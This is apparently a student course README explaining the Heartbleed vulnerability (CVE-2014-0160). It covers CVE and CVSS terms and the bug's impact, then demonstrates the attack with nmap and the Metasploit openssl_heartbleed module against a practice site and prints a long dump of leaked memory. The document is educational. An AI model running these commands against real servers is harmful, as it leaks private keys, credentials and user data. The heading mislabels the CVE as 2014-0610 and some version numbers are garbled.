# ECE9069_Presentation2-CVE-2014-0160 Heartbleed
![image](https://user-images.githubusercontent.com/46683010/158703429-872f90cb-d21a-4a2f-bb00-2f4926c1136c.png)

## Terms Used in the Report

####   CVE
CVE stands for common vulnerabilities and exposures. 
It is a publicly disclosed database that contains information security issues. CVE was launched by MITRE Corporation firstly in 1999. It is now managed and maintained by the National Cybersecurity FFRDC (Federally Funded Research and Development Center). Additionally, the sponsor of CVE is US Federal Government, with both the US Department of Homeland Security (DHS) and the Cybersecurity and Infrastructure Security Agency (CISA). [^1]
CVE is similar to a free dictionary for individuals and organizations to improve their information level by identifying, defining, and cataloging publicly disclosed cybersecurity vulnerabilities. [^2]

####   Vulnerability  
A vulnerability, a kind of flaw in software code, could be used by hackers to gain direct access to a system or network. Normally, hackers could act as super-power administrators by taking advantage of vulnerabilities in a system. Plus, both access and actions are mostly unauthorized. [^3]

####   OpenSSL 
OpenSSL software is a robust, commercial-grade, full-featured toolkit for general-purpose cryptography and secure communication developed by OpenSSL Project. [^4]

####   SSL/TLS
SSL/TLS provides communication security and privacy over the Internet for applications such as web, email, instant messaging (IM), and some virtual private networks (VPNs). The Heartbleed bug is not a design flaw in SSL/TLS protocol specification. It is an implementation issue when the OpenSSL library provides SSL/TLS cryptographic services to the application. [^5]

####   CVSS 
CVSS stands for Common Vulnerability Scoring System. This system provides a numerical (0-10) representation of the severity of an information security vulnerability. The more serious the vulnerability is the higher score. 
  | CVSS Score | Qualitative Rating |
  | ------ | ------ |
  | 0.0 | None |
  | 0.1 – 3.9 | Low |
  | 4.0 – 6.9 | Medium |
  | 7.0 – 8.9 | High |
  | 9.0 – 10.0 | Critical |

![image](https://user-images.githubusercontent.com/46683010/158703747-406cd690-95c8-4a8d-9a37-2e4d6f86e821.png) [^6]
![image](https://user-images.githubusercontent.com/46683010/158703788-e51841d7-2144-40a1-b9a4-5de4f984653c.png) [^7]

## CVE-2014-0610

####   Description
Every specific vulnerability in CVE corresponds to a serial number. CVE-2014-0160 refers to the Heartbleed bug. “The Heartbleed Bug is a serious vulnerability in the popular OpenSSL cryptographic software library. This weakness allows stealing the information protected, under normal conditions, by the SSL/TLS encryption used to secure the Internet.” [^5]

It allows anyone to read the memory of the protected system with the version of the vulnerable OpenSSL software. Attacks have the accessibilities to eavesdrop on communications, steal data directly from the services and users, and impersonate services and users. 

Although this bug could be fixed by the new version released, it has already exposed a large number of encryption and decryption keys to the public. Therefore, the Heartbleed bug is considered a seriously treated and unique vulnerability because of the long exposure and ease of no trace attacks.

####   CVSS Scores & Vulnerability Types [^8]
  | ------ | ------ |
  | ------ | ------ |
  | CVSS Score | 5.0|
  | Confidentiality Impact | Partial (There is considerable informational disclosure.) |
  | Integrity Impact | None  |
  | Availability Impact | None  |
  | Access Complexity | Low (Little knowledge or skill is required to exploit. ) |
  | Authentication | Not required  |
  | Gained Access | None |
  | Vulnerability Type(s) | OverflowObtain Information |
  | CWE ID | 119 |
  
  
####    Overflow and Obtain information
![image](https://user-images.githubusercontent.com/46665590/159080691-197fade2-f5ac-4734-aefa-0b9d887a78e7.png). [^9]

According to the Statistical data from CVE details website, overflow is the most common type of vulnerability with publishing dates after 1999. Overflow occurs when there is more data needs to be stored in a fixed size of memory. The extra information may overflow into adjacent memory space and usually cause system crashes and memory leakage. 

Obtain Information, also known as information disclosure vulnerability, is leaking sensitive data unintentionally to its user or the public. Depending on the different context of different websites, all kinds of information including:

•	Users’ data, such as username, password, email, etc.

•	Sensitive data, such as commercial or financial data, patients’ information

•	Technical details of the website, such as the infrastructure 

It mainly occurs when there are insecure configurations of the related technologies, such as default configurations when the hacker displays overly verbose error messages. The impacts could be very severe. For example, an online shop website leaking the credit cards information of their customers. However, the severity in some cases depends on the purpose of the hacker and what the hacker will do with the leaked information. [^10]

 
####   What this vulnerability could affect?
The hackers could take advantage of Heartbleed bug to gain the memory of the system when the system is using OpenSSL software in a version that the bug is not fixed. The secret keys during the traffic would be impacted directly. The whole communication would eavesdrop. In practice, Synopsys, Inc used this vulnerability to attack itself from outside. They finally stole from themselves the X.509 certificates secret keys, usernames, and passwords. From version 1.01 to 1.01f of OpenSSL did exist this vulnerability.
OpenSSL fixed this bug in version 1.01g on the 7th of April 2014.


####   2 Public exploits
•	 ![image](https://user-images.githubusercontent.com/46665590/159080883-a0cd6c00-285a-4821-beba-fd80e2d14d57.png)[^11]

•	 ![image](https://user-images.githubusercontent.com/46665590/159080915-1cacb9e4-f0fe-4467-87c1-d64ecf2321a9.png)

There are 2 public exploits found on the exploit database. The author Jared Stafford disclaimed copyright to the source code. The 2 exploits directly demonstrate the ‘Heartbleed’ memory disclosure caused by OpenSSL TLS Heartbeat. [^12]


## Exploit Demo
In this sample example, www.scrooge-and-marley.com will be the targeted server that we do the Heartbleed attack.

#### Tool used in this exploit


##### nmap
_“Nmap ("Network Mapper") is a free and open source utility for network discovery and security auditing.”_ [^13]


##### Metasploit Framework (MSF) /msfconsole
_“The Metasploit Framework is a Ruby-based, modular penetration testing platform that enables you to write, test, and execute exploit code.”_ [^14]

The msfconsole is a command line tool of the Metasploit Framework (MSF). (The following screenshot is the interface) The console provides users all the options available in the MSF. 

![image](https://user-images.githubusercontent.com/46683010/158705066-b99c2103-f26b-4f8f-8391-d0862498e7f0.png)[^15]

##### Exploit Process
  1. Test the web site from the vulnerability
  ```sh
  nmap -p 443 --script=ssl-heartbleed www.scrooge-and-marley.com
  ```
  2. Use Metasploit to exploit
  ```sh
  use auxiliary/scanner/ssl/openssl_heartbleed
  ```
  ```sh
  set RHOSTS www.scrooge-and-marley.com
  ```
  ```sh
  set RPORT 443
  ```
  ```sh
  set VERBOSE true
  ```
  ```sh
  exploit
  ```  
  The attack result is displayed below
  ```sh
  [*] 23.239.15.124:443     - Printable info leaked:
......b1`.)V.......P.l........rz..Ma/...f.....".!.9.8.........5.............................3.2.....E.D...../...A.......................................20for%20in%20the%20very%20air%20through%20which%20this%20Spirit%20moved%20it%20seemed%20to%20scatter%20gloom%20and%20mystery.%0A%0AIt%20was%20shrouded%20in%20a%20deep%20black%20garment%2C%20which%20concealed%20its%20head%2C%20its%20face%2C%20its%20form%2C%20and%20left%20nothing%20of%20it%20visible%20save%20one%20outstretched%20hand.%20But%20for%20this%20it%20would%20have%20been%20difficult%20to%20detach%20its%20figure%20from%20the%20night%2C%20and%20separate%20it%20from%20the%20darkness%20by%20which%20it%20was%20surrounded.%20&Website%20Secret%20%231=Hacking%20can%20be%20noble%2e:Y.p..sY...S.:..pm............................................................................................................................................................................................................................................wC8zMZWsCJkXkY8GDcnOjhiwhQEL0l68qrO%2BEb%2F60MLarNPqOIBhF3RWB25h3q3vyESuWGkcTjJLlYOxHVJh3VhCou7OICpx3NcTTdwaRLlw7sMIUbF%2FciVuZGssKeVT%2FgR3nyoGuEg3WdOdM5tLfIthl1ruwVeQ7FoUcFU6RhZd0TO88HRsYXfaaRy......TP..o...2B..................................................................................................................................... repeated 14918 times .....................................................................................................................................@..................................................................................................................................... repeated 16122 times .....................................................................................................................................@.................................................................................................................................................................................................................................................................................................................................a@.....................}.@....6...J......9._R...t....Q....c.r......~..Z.y.B.*).2JFzc^..Y.7{...3..F..;r....x.[....xt.}.......3...b....t}.....h..9>.$!.........;.yj!.3. .....K...k8.[m7:io.R....o......@;.6....[.1#.....L.Is..<..;..7..P..L......p*.rB.p.1.0..f...L..d......:p...i.v.O..."C.....nW....C......BJ.K!.".y{..;..u...6.,L..._,....Q.8Y...^~w..Jj...s..c+.4...g2...R..!'.).pkU&v..S..O..Q....^..v.>E.h:.'.K_......0.j..0....^..v=)5.....)......0...U....0....0...*.H........................O.....].9Td..........6HY9c.gzC..)....-.T.R.>...X.p.04...g.UK.].hi..L.[..v.iO..`G..iuT.KTfn..+.....Q./:.T.......ZSZ...,..8O..k...)A..1C<.....-&..4P.a.7.TE...,5.x...L.;...3y}4...72*.0.=......Yd..-wx...ile....C`mZ..7P$.....QD....=.+......2"..(.....R,.W7.]X..f...<...a.z0...7K..._..:...K..\.....u.^._....3Y.N.`yLN..7=..11..[..j......@.el..k..J.D|..Kg5w....eX4UL.-.._.]..z......i*=............U....q........=#..}..3.[t=...Z....:.5.y..E&..C...r....3.4Y..a.1....|I."..J.u:?..KNXX.b..^........!.o...........D,.....;..7........t..;9.(.....z.Y...>.(..c.......3/.p...Op.....v.8.|..a$.......]E\ ..'i..5...#.h.....m..5...3nL./j B....Vx_*../...._..6+<.V.k.V.K..:O.r../."...Z*..i6Y\c..^~.4.%...C.....L}..bs...X.....?..D.iI.2.H.H.f...53D...J..BY.x...$...0J.oE.5.....6.%F.q.I..~.k........6.x....;.9TI.=<~<....VB...........`..A....]d:.../......$..Y|....~..}..u5sN.`.*G.WP.q.L...u...t....6.'..N..:.=H....IRFO%....f`|.Q7.....~.v.s....g.......&.........c..Ih.......T..._N.V......y>S.?....,2.....~.P..........Dy.\.o..ha.]?r.fc..N;.....,Ut.p.b.5.......#.n....8...#....-.+f'zK=K9..R..<.y=2...+E.SF.-u......<.......p..H.%..\*.8.F].eQ..6..........2j.G...S...t.]......m......G^3k]7.:."..!Z.q$Wj.-....mUq..R.J.*m.}08+U.0B....1..p.4.E.B.R.=.I....~..?...p.-..A.`b.p.[-.+.92....)..3.Y..;}y..X&i.%.S.....q..[..X.....%'.........s....zQNi..,.!.>.....X2s.Z....5T....B...nJ...kl.G..o.O...u.8..1l_..i....xy$..#J.k...[.$b..b...'c..]l...=......a.y)p....q..R......U .j.5..^.t.;.=}..e.O.6|/...xZ...+......\.........f.u......W....H...+8..|h)...... .-..4Jl...i....eq..}.0....F.2..Lb\F`...%....q.FQD......*.@..E'..Pt....(.9v.......Q~.t.....2c.....}J.2i.^......,..w.F.%.j...J...M..%fY..%...U..W~].$.s.|...\>..?.....n_.D..w.nKLH........l.^{.m3.n5!c.......N....!..u.y...L....5..A6.......p.$.......Q...a...NV,..,.....(.......G....}.) &.0....|hN........%......................".P%><a..G.>.E....`....!.l.e......``... .ed._.....5....1.7JD[.sc....~.$.w..P?..7....04..swq.Dk.....c...5.tf..7.....8......~.4....nM....MM=.._.n.v.4.'.P}....?.uy..Q....=..LQ.....4..w.[..m..=\.r.....H.../.Jm.r....9.:.o.PCV...j.M?.ah....z.....>..^.!..e.....qN..)P.Z...I........>.2.9.U..e..`..2...3.oy.^......f......../...........0e..5...<t...V...&L.?%Q..l.....".;{q.c.e....?..P.:.akD...A..6>|k..."F....I.;8......:.e....:x.l...r .|+....M.....Un..f.FS.*F..wo_w.1p.....n.....AQ....1...]..].X.;..$..C..D..t.....%.^....y....(b^....oR.%_....]B.N..:.......)..=..8#.._...3...R&.Cl...j.J.s.Q.}..j.Nb..Z....#.......(9?/G.0yb#...JB<>..I).S..P.U..\g.<J..7..\g.?d...O.q4.PQI..'./.`.&QTB.+.)kI..?a.*8.....i....cF......&L..(.h..AB.2D....C!5 .....lk....%.....!`7.&.....w;.y..J.TdXO.l.0;.....$.8H...6............U/..D..<E$Q......(Pm6^......d&pj.t.......Z..).........C..`....]%..2.>...[IA...0..ZcJfr..IC|..<Q.x..I../..8e>..bP..e8ic...N......\SY1..0...j!wwC7H../c...d..*.C@f.jf....r.f^m.+..2..dOU9W..B...........X.D..D..4...+...R..U.^v....u.6..MJ..G...K.A.8VJ}AvS......0....).......]..*.Q.....@.$.NJ0.v..K.......\.a..A.@..W..Q..PE.N=......F..4....Y.CQR..2u.4U.z@.....+.^(........@...@P@.!i..w..I..2yy....[...m.L{...<..9. ...*2v.X=.h^~.....^.e.P.......c.^....P...6..F.N..@..&..4..z..$..S.O..z...b.0K....,..:.!=..in..*?..o~....5.5.D..G.I...v/.#4......v7..m..[..,!...*......<.p......?..up..O|..5R..I...(W..-..3...Ox`.>.....FY..2.....x.....v6.c9..pG0..\..ZP.....^^....l=>..*..j.?S.\7X...6....r.q...X.,A.E.1Y_)..d..z...%*Q.......{....Z..N.q.m...L....r...j}..6..M.S.c..?G......k..t..}.6.e.t....:.s.%.R...1.!D.qd3D,..C........`./b.....(..{..J.!....n5...t.K..!3C..\..*...k.G%5d&#....c.9.c....k..V.2%.`]X6.dc..>..(...."..25;.@....t~%l..o.B.6..T.jN..l......;........'=..x..k.f.A.......$..e..\..T.R.:..(....MW~...]Jn.Sy...*ycy.U.CrI.^l<.....R..|..y.........N....._m.. BdB..V..]!8Z.e...."6.H....j.h....|...xPt......."Fc.e.#{..FM...D...-%..5......O|Z$...O..s`.M.t....s...a(....iL..z.....N.\.ok....a.......x,.'.v..h.......w.?Jk..<..,K.BB......Dj.'<+s5....D....C....{..B.K...S....!4....=9.h..+..7@\ZG.y...k...._...U...$m...$P~.O.X[.-.E.b..(|..dGP+......~>...B...6.+. ...D...e.3................S..FT..+.$6...e.....2...xj....B.T....e.].mN..B.V..".m=.;...PQMw$#L..W!Q..m..;..0.....<...........!.....F....N..N...0{..."... n.j...K...n.}u2. ;'!IY'....'.6_..C[.vy.....!L.&r..x..D~.............>G......|..g$..Iz}...j......,..$e`...tA3.Z....7.B]\q......WE...p).wt4V_..|....B..WkW.T..C..C.C|.F...$p..t.*|)^.....k._..._...!.HE..r.|.r)....S.....}.*.`.;.C..v.TsV..3..E.^aJ..eZ.....ADv.+..n1..URq.........*...Y..F.jP.K...s...s.ZA.;t/.mO..3..g..<k..5.....*[.....5>E.'&......_..zf.LE;.<d.F1.}....W....Xh....zcl[.|K...:G*.:.>,.w.Tp9.76...F.pT.z......U...Kd.^.'.s]....|b.JI.J..]h...V...x?ez....0I..3. .OS'p'..*.,..g'....0Q..'P%iw.. ....&$?.'.L.'.A..KJL...D@....G...m.....\J...k..BQ..N.......Md...+.z....:..^E..P..L.e.j#./..qBe..]-...V2s"..9.B..g...u....j%.0..Q..i]z..(...(........+..R...b.8..s..UE.0.'n*'..P|..[.Q<......X.6.^L.......7.l..P(8.......!|.;.._u.....y.."..5.&..t....J.Y.....h....1....=R......(aK..c2#.G/......k.l...&..8..c.r....74..."..]....iA(y.M!........dn.f...N..D..'hiY.....r.Q.F...'.:....C..4....;4....D.....E..m.]XoEQ2...WL]...DL..#.....ths..ZG.!..F.G..a.....3.<.=J}.........\.s.....4.....d.T..-*...........L.w..rl.r2...L..j8..rn.7.9..'j....\rQ....m+.v6s.>.Wu.%:3..m..N.].B.-. ...h.Z...q#VE.C.$C...fo..p..K........X.b......x..2.Y3s...6.......... .9.,...p..u.......#.g..%.....%.\..*....T........N.....H..D..dsz9.W|Iw..F....,_..q..b8- .oY%.......'....H......,.?...5....Q...(.W..W....[9\.D..Qq.4y.....Q`...K...-..N.To..E...0&.\.[[.g...B...yB...7IA.l....(..O.......R!.N.W..Dg.W.j.T...w..[...m......a.^,..4..f.b.=::......6:K..H.q.J.../....w5../m..Z..)...r-f...iQ ...g*.....2..*v$4..<.3..(0.+.a<l.a.<..u..#>L.7...`*.&.$..c..2...^.K.M1|...2W@.3......u>..<.2.}(9.(..u...}.).B..g.{r...R.r.....d..y:u`...........p.....|..<.{W...Fo.....UWy..Q....\.....A..g`..[.5%./....!\.....-<.:I..~YnF..*..s.-..'&.f..($.8l....l>.$h.v%'q.w..J...C.Yb......S......5...>._.!.@[`.b%....,.c....MN..........Ib...#.=..4.......e...T.!....Q...F.E./......E.^'\.....{....lV...t_[.E/.u.L.Q:.uE..}...._..#..M.n.B.....e.D.N#..WX.s.63.s...4.Q.s(..en...-....B.9.;T.a.g.c.);$.p.....@G:...L..&.$.d...jg.T.^Cpo.(.xE....aui(.........lo..M...b........c)..j...ZO.@....t..[.).....l...PH/....p...O5.M..4TXL.y..5.q....v.....+.]...5i.0T.{..<.kAR....s.}.K..mw.v.>..a..|.0m...B..^ />...D.]...X]S.zP-.....@......A..b7E+r9T../... 5.b...;mtI...Bb.......2..4....vY..o..9@,.....<..>...Nmb.4..&Gj(............g".......uo...z..}p...."..%..9...$.i.,.>9....dF:....vb,...de).p.<.3.s.}...$....^@..B...r..3.2.N..z..#.9.9{Q..W.....B...,.g....Z...DfS]/..............m...t....Q..$]c........sX3P.........[?.S.4c....Jt..d05 .o..J4 .....k......>.....>^.<'.k..)....}.'..I5......j.0O.,.H......d..F..|.-.....RsU#.].J...-....?.@.^$.*.F)......d..........9.9...Vr.nW.....;.d......oe.m..8...t{.'k..z.:1d....n...a...zx...<....[R|.....z..Yh.wVI....,.M.{8=........@.^E....2D5.C......M.ay..T....8.B?......R&u}....te...%.......I3....)...l ..E.*>M......6/,..~..w..}.q....`.2...g........^....g ..@^.8..9}E....L.......i..3..|WsD.t....)..#.m.Bi......dN?....\........._..Q.C......A....i.c..c.R]...I....6......5.S......Z...."..v...u....2..;<+.4..-.}$R.j...L...u..ggb%Z.V...).b...ng..|d..8C.VaVX2.....C1.....W.}0.D.....[%%...l..K.#`r.m.;N..j#.##...`u4...g.....`._<vno..VPE...H..~.RV....Y. p..o.&2..*. ..0.KYk.2.......0..Y......aF ....%e....*+.G.....b:'..%.~...I.l.gr..F..:E.o...]..EN.....h.9.-v.......xx>..g.6....%.@.:..F...89Zk1(.6]"s.3....0YS..8...u...-.X....;R.=..[.C}.@.>7.~.Y...E<......SF{D.......|.5._.5.{A.@~..../j.G.....F..\.!A....y..K... .H.9.0.Z...gq.E.Haj..T.r.;.ir.[..T.....X~..#...6B.....Q-.x.....lf..5..B...V~.>4.w..KJ.....v'%.......93......j.H.|.r.;..O.P..'z.v~...(6.......l.*H...e...,...a.....q.."..Z.L..... g..VK=..j...w..ji.........s4...F[.e..1$..).)L.T[..=...`.....I....>...-..up.Hd.~%........r...zR.......^.n%.S?.u..XK...<.R.R...,r.~.b....$P.zo...kE.K>.]e./..b..8!\Z8+t]...F.c..l.}..........^E.:.&+...O..Slz.G^.. ...t.I^..sCR...(.m..%d.[.!)9Kj.$....e@O.....@e.?9..<.....a.e.J..Lyp.d.2..*.:..8......g...|Ui:m.x.].0P5..."&_....w%^...ed............._}..e.0l]..jv..<Rl...a.K.`Sx,..a...9j*.4.z..m>....!H......m(.....!)..V.T.yc.d.....a..@'A.Oy....S).O.=.v.f....J......_.6.w#..l.".P..=(.!.w... .V.-..g.....R.....l..^....QU.......=r.MjWh...;7..\.Bsy.(..^N..............*..O....qHK...5r ...u...V...8@.d.9=.Ra...[.RX.f..'.......`d...R...%:g$..a..........F.ym....y.$.crE....r<9EA.)......+..o3....H..z..(...a.RL..A.q........7ab...p...[.x.\]s..W........n...c..A...pT.v.I.(.9.gw....Fv.{..J7_../......(....../.$MA.u/.Q.M.....M".f..y$....'R .1.["......l....j....p.......v.r.g.A..H+j....Y......H...p..)*..;..T..*4....uL.....^hEX9.n...y}.li.n....(.O....4.O.m..Bx.N.}.........".#.9....0{..........|.M.8v8M%.vd..1\.0.-.......o..E..X..[..~..s.n......".....0....NAz.J.\.*...jG_.......G.....b..^...PI...r...........~.SF....+..A..c..88.K..Z.a,;25..m.(ieiTq...a....=.....Y......Q...Ck6...*..K..E...I~-@...$..|.2.l6..........QW...............t..].7....Z.A..Lz.S.T..{>.....'...^.d.Pu..,..E[.L..U.!.Y.=..L....|...;.1...$....j.7....8./.$.P....$...!.l...\+....}......O..qb.)M.S..6.t..I.U.+^.b.....l..z6.....>El....k......'@.......k$sA.&.x.Y...;.(.........@S...j..B...._. a..Q..T.<..PR.X\B>&.n.Q...E..\x..x.<.~.Hn........v....$./........2t.......em..\o5...q.3.'..1.h. |..3..<..S..............U..Mtm....r_........J.$...*............%...*./.j. ...Q.....Y...|...U.%/. ....xv._.d...i'......=.....@.,7..6.#8e.k....n-..@K@..in......P.+~$.......p.Wxa.a.........m..p.l3$.-.~.......2+.<.*...B.L.J|.~.ny.+K%K...-.Z.$.....}.Y.nI.....JJ..F!.....o.fX.....`.....2...M....g...qV.J........A..Ki3Sf:9..a);sh.B.8o..E.......7.0.3U...(.c\.K.Bd0....A..V./.xs....@(>...........K....j{i.."...M:.Mu...6.hm...ft.....n(..|)h...Xa..KH*W.Xpf)....8.....-]..<..h..?.|..[...h..}Y..".O...K..........a....jS.Fi.._.I...h-....QW.;E.....}.......Bg.G..(.^"...xp."..:_B8.J5.........w.....y."p..;$..d/...e..e.t.g... .Z@.]7/g........V.^..*.S..S..k......(uuh.M4X...w....=.%|..A.g..j..>SxW.A..M....5....'H.g...q..a..P..o{.H....h....{.$......X.."86..`.$...]...fC.......7y........^d.;zxO.j4.&7.2.....]..*/............m;$..l..$.Qe...V.................)...|.....\l.J....'LG...v.......v.O...0..9.B......k.oj%.....|Y...g..1..Pd.QH..<...|Z.....h..[.....%..../S#..y.X*G...V..u.%...(..t..L!...eN.....>......gWW\..m.KBK..k.^.....hU.n@..r.<p>XD.m.....m..;....hK_.......8.A^(...zTq5.$..wm5.j.m{.i.8..Q3Y.....1k#c........z.B.....=.`.a...%..0....R..B.s!.....r...3.(U.\...0.. ..CB.f...{nm>.-..@1.D.V..mq.C...w.Z...XU;#..ZXHt.;xW...,n......... .5..:.e.a.P..o..I...;<...Dy...7.0!?(.........y1...f.#<..y....$V_.l.Z..._.......&........`.v^1......$..v......V...@.V#...`....~BG.F.t......J!g...6....~.U......i....c....;.!.......F...m.....G:?..f}...7.0..4..Oj...n._J..;qb.).X%..h..............Z...+.[..P..z...A......q.....F.I;%...X.<I.W...E.72.5...tV.:F.f..........Lz..kt........l..S.i>eG.S.."Ai~...(x..;.c....*.ycUoS.J..3^g%...g}.kV,....=.>...,n*S6..F...'...........E.......-..4.ZA."A....e%(.5..&...C.22L...s.W3.J.3V{..'...,.@.H.Wl2E........A...e..=..p1..J.c..[.S..L3"..I<W...Q.e..-!....r..d.....w<...Kbs.B..Iiy>Y..5..v.........mvx*h...:..(.y.E..h....\....e....V....K...*58..29"..\....@.....;..W....."......Y.yT..\Iu.13.Y..O7..4....(.0..\.Aq.C..+...p.A..t..~..f....c{.2.KoBm7....9....M.+3U.P..^g::...D@.?.....{.m..JzM..#.Xe.._)..6:...+J.....$..&...t......l}g.=..Z[.rQ-.Zd7..y......\....Q.P.....`E....wG.....n..!4M.9......!..V.R')Is.Bv@'....E<C)..(}j....N..S#FA..p.V._..>p..x...3W.[p....'1...i...N..r....T...K.a.K....ZI....2S....%....q..kK...b...Z.#sg...Aw=.i.S...S;.8.....O...$.*?h..jm..%....1./(.....~..re..W.....y..?#...:......7xX.Cr._..}.[...@.....0!..u.j..qZZ...A.FZ..7Itl...........%_..J....L;lmm8...N...]....m.][....Cq~.8.LG...l..g.x.._.....^...a.<-.]k..?..[../...d{..A!.g}!....]s.oX...e"...b....`..\.......>|G...._.`....X....@.EU%...PW.......62f.....6.Fd.~UJ..../...$u.*D.g.C.S..#.`yN.w.bg..L../..x..-7./.%.71i.>B../..c.8;[..o.2...._-..:.oI8...j........^.@..m....ni.(R';..".".kNJ.......c..I..0)G.p...&;.r......r.q1%.....Q0.s.2...K.~.....#u....!-.....i.#.....t.Ff.....H.4.$E...C.x...Q..35.....4......C....!...-.s.s...{......V.8..n.H'}.!..0.C+G.,.?..@.m5...<.....c...Fvk....C.c........Rg...z.0~9.4p".........j-b.................MW.zbQ.T.k..)........9,..Z2...n...{.f...eT...a.5Rm~Z..[F...sq...7-.{Y){..-D?v..d.9e.qU&_E.....CW...~.H.r...*..o.....6.@.z..K..U.....wE.'.o..../F{+p.rJ..{.........h..#....D....8.6g5{...E...P........^u.~..+..+:.Q.~.*...e`....Ga...\S..5.c..[...s...U`.P.{...FV....h....r1......Z.g......a...`'..7..A5...q...]oLjk...$....d..).JpA.E& .....*.d[...:\.tfF....f6.0xB..;..<9p{..F..xH\.i..1-.&Nni.w_ebe...Jr.@N....$?...f.....Zg....c6dA..WJbK...kM...>..b...H..2...]..b......w...l...ea~.x..5.z'z..1.^.....=....g:!...(..z.U.>.(lB.0..l...o.h....,....!..@_..=. .];..M4..a.+.>.%.Zx...i.kEy.5.;.jO..*$...i..hO.W.....).QU].~Y^.p....`.Q...V.....3...4..........c(7..W........Z.<.s.. ...s..<...G0....4........2.HN.p.....G|.NK.._...!Q!...U.Ie.8|..A.y.<.%..\,@.b..2.{.......c.......t6....F.FS....^I.-6D..{f....`..D......W.r..U..+...d2.v.).y..4...0..aY.w_..g...Q..|E...v.,.~.... .~w.....`[...z...<..<.....f....-...'.....VJ...(m..]....;N..yr..%v...Yk`....u..F4...~(.,Y.t.7.T..Z..bHT..Q.....V3-<Ib....B....<r%.'.....a.....b../.xS.v....K..5....^?..)..bR%..j.X..H..t@.i...0./GN.g....Rm.1....h.e.$.Tn/w]UW..>..n.......jk c....X.....OR.fTZ...fl.S:...~.................v..V...P2..7....[Za..QL.B.=.(.{..O,.Aj....,...R~..|.(.#...Z..E......Z.`.F....-.Z..Z..}D..l.X@.."..hy.......|..>")..o#.O.v.>.Q...N.d..NI..?.,.....C.L0....O+.........U..........4..x|.._.^....n,G.B.~.g.....u..c.e...U2.C.<M..0*m.M........V.PU ..Q..9.e'h..@...{.._...^.....`..........W.h..P..X...7.u....;..SYY.'...Bz5..-.m..2T........v...._..2'~... .E...-N....]..............}.....!.#.hBIf....S..S.l4)b.<6z...>,6...G..R..&N..*F..<I.S../."n.>H..Q...rgq.U.g3[......i....%..y.)#.^0.7.u.[.F...9(k$I...y?pvC&...........^v..-f...7.Tp..2..HP....{..{...$.C..63.|mKX.....XC.............5...O2Lt}.V.A..../.....+?.&..C.......&.......wQ.J0..C...].`.....1+.....1y.Ql&2....B.....5.......S.X....k....0@Wu..`.z.Q..{".......h.....=..S].|X.Y..%}.cr..PZ..6K..d..B.e.ev..(...7..l.F.2.\N~.>...Y@W.O..(...z...i@b.....d......)j.....D$.rto.q.....P.y..n..!Y......NN.{.......n.....`...2.....D.....n.......X...#..y`...+...$....}/B....e...pg..J......=........e{....!..._.:...M,......o.......-.....'J..G.S....}}............H./...7..[kQ.......Nm...9..1.v.?.P..DsB.....(.l.c...r...6C.....yL..,.IW5b...lp4....x(..*9..4....la.......\...y....!.....D....Dv..wSg....K..h..}...W.2d.".p/..0....fn.....FM.EM..........n~vl"L...Xv.sOj.|.C.`..DrWs.).7....zIG]..ky... ..I.I......m......h=......Vh.ao.q.....<,....A$......0........&A..j.&..........Y.4 f..F.!.&...........}O...p:.K@T..\.)..a...@...*..o.WF....6H64....Z)j\1}X....N...v...hAJ......W.^......@.7v..+o...K...[....7.c.sd..D~...$...>y............ ....V.....R}"..8.;%.d.ItJ...H..:.....M;.....&......cm.P:9.~.N......-(YN..O.....?rn.....q|7.....:.9.z....K.._.^.)...5........l....qn.)........U..d.@@.X.9\2^...g.E.f.....@#.N..va.....<Cn.k.N...EJ....Y.......(.=V.M#UP+...d.2,..f'7...J....._..Z2....Zc.......c.'..r'.1.X?W".".r...N.. ..zQ...RS....M.)....J.>c....".7.2g..p.........I.T*Is..5.}1..9...........b.K...y..z......{..!C.Z.....L?..9c....-....G2.a../wy..5.X.o........Jzjl.%".|.R..%.....1G..}.:8.8..\c..n8}.;.t....k..u/.&........OY.!x,..nt.....a..x..B^H=>..E.lk*+e.D.R..K...91.......?.4.#..$...A....*.c5-..N.....TN.g...dYr....^.."..H..t.K,b.d?.r......=5..:.P..L]r.v.C....5GY9.(.....W.sB#.d.1u...~a...L.%..|..^a....oU..../.$e...h.B=.......h~....T.Qho(QU.....Q.....b....^(...W....t.n~............Jt.'.......sY".O...5..-|......4E....E#.8.Tx.I0.fBPb".C.C...t|..Q.....L....dk...q..'..y0?..?f..Y0yIu...(v...X...2../MZK.]..lb.^...<.).......e...a.9.y...BR.....c....v.}..r(.......x..j..Z*HO......@.......)Hm.}7....`mC.Y*0.:.Hw,...|.......v,M.^....r`...m}..y>.7....O"*.^9..7y..I.u.d.v ....3-.g{~......o.M..F...U.44Q......b....8.S..$7@.b).7.:n..s.b^VXh.Y........'..;@..`m..u..........p.....x3P..V{j.J....$.icu...s......$u5.mc...w.D............+X8..<^.L..[-...4.x. ...}..y8...>k.v..$..m.-....~..G...R*;}.(.6`..?..rZv..%...0.&_...W+{\..,.kP.......i...i6.4...[............................................................ ......<?xml version="1.0" encoding="utf-8"?><soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><soap:Body><AddPortMapping xmlns="http://purenetworks.com/HNAP1/"><PortMappingDescription>foobar</PortMappingDescription><InternalClient>192.168.0.100</InternalClient><PortMappingProtocol>TCP</PortMappingProtocol><ExternalPort>1234</ExternalPort><InternalPort>1234</InternalPort></AddPortMapping></soap:Body></soap:Envelope>.....detach%20its%20figure%20from%20the%20night%2C%20and%20separate%20it%20from%20the%20darkness%20by%20which%20it%20was%20surrounded.%20&Website%20Secret%20%231=Hacking%20can%20be%20noble%2e..................................................................................................................................... repeated 11324 times .....................................................................................................................................aU.............}.@....6...J......9._R...t....Q....c.r......~..Z.y.B.*).2JFzc^..Y.7{...3..F..;r....x.[....xt.}.......3...b....t}.....h..9>.$!.........;.yj!.3. .....K...k8.[m7:io.R....o......@;.6....[.1#.....L.Is..<..;..7..P..L......p*.rB.p.1.0..f...L..d......:p...i.v.O..."C.....nW....C......BJ.K!.".y{..;..u...6.,L..._,....Q.8Y...^~w..Jj...s..c+.4...g2...R..!'.).pkU&v..S..O..Q....^..v.>E.h:.'.K_......0.j..................................................................................................................................... repeated 2961 times .....................................................................................................................................
[*] www.scrooge-and-marley.com:443 - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
  ```    
  
  
  [^16]
  
# References 

[^1]: https://www.balbix.com/insights/what-is-a-cve/ 

[^2]: https://www.cve.org/About/Overview 

[^3]: https://www.csoonline.com/article/3204884/what-is-cve-its-definition-and-purpose.html

[^4]: https://www.openssl.org/ 

[^5]: https://heartbleed.com/

